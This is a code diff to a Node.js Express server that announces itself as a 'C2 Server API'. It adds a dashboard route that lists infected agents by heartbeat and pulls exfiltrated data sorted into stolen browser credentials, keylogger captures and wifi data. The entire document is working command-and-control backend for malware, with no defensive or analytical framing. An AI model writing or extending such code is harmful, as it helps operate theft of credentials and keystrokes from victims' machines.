@@ -255,6 +255,34 @@ router.get('/exfil_data', async (req, res) => {
     }
 });
 
+router.get('/', async (req, res) => {
+    if (req.query.type === 'dashboard') {
+        try {
+            const sessionsSnap = await db.collection('agents').orderBy('lastHeartbeat', 'desc').get();
+            const sessions = [];
+            sessionsSnap.forEach(d => sessions.push({ id: d.id, ...d.data() }));
+
+            const exfilSnap = await db.collection('exfil').orderBy('timestamp', 'desc').limit(500).get();
+            const credentials = [];
+            const keylogs = [];
+            const wifi = [];
+
+            exfilSnap.forEach(d => {
+                const item = d.data();
+                if (item.type === 'browser' || item.type === 'credentials') credentials.push(item);
+                if (item.type === 'keylogger' || item.type === 'keylog') keylogs.push(item);
+                if (item.type === 'wifi') wifi.push(item);
+            });
+
+            return res.json({ sessions, credentials, keylogs, wifi });
+        } catch (err) {
+            console.error('Dashboard error:', err);
+            return res.status(500).json({ error: err.message });
+        }
+    }
+    res.json({ message: 'C2 Server API Running' });
+});
+
 app.use('/api', router);
 
 // Vercel serverless handler
